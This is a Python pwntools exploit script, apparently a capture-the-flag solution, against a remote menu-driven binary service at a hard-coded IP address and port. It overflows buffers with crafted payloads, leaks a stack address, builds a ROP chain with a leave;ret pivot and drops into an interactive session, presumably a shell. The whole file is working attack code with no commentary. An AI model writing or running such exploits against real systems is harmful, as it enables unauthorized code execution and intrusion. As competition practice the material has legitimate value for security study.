from pwn import *
import hexdump

HOST, PORT = '0.0.0.0', 31340
HOST, PORT = '1.224.175.28', 10040
stager = 0x807c90c
stager2 = 0x8050d30
payload = 'a' * 10 + p32(0x1) + p32(stager) + p32(stager2) + 'aa'
cnt = len(payload) * 2
r = remote(HOST, PORT)
r.recvuntil('>>>')
r.sendline('1')
r.sendline('a')
r.sendline(str(cnt))
for i in range(cnt):
	r.sendline('title')
	r.sendline('Y')
	r.sendline('comment')

password = p32(0x8049b70) + p32(0x80edf30)

r.sendline('3')
r.sendline('0')
r.sendline(payload)
r.sendline('%')
r.sendline(password)
r.recvuntil('Your not admin...\n')
data = r.recvline()
print `data`

stager = 0x8048419
bss = 0x80ed000
ppr = 0x804838d
rop = p32(0x0806E25A) + p32(ppr) + p32(bss + 0x80) + p32(1) + p32(0x8048345) + p32(0x80bf4a8) + p32(0)
rop += 'zz'
payload2 = 'a' * 10 + p32(1) + p32(stager) + p32(0) + rop

leave_ret = 0x8048d68

buf = u32(data[:4]) + 0x34 - 4

password2 = p32(buf) + p32(leave_ret)

r.sendline('3')
r.sendline('0')
r.sendline(payload2)
r.sendline('%')
r.sendline(password2)
r.interactive()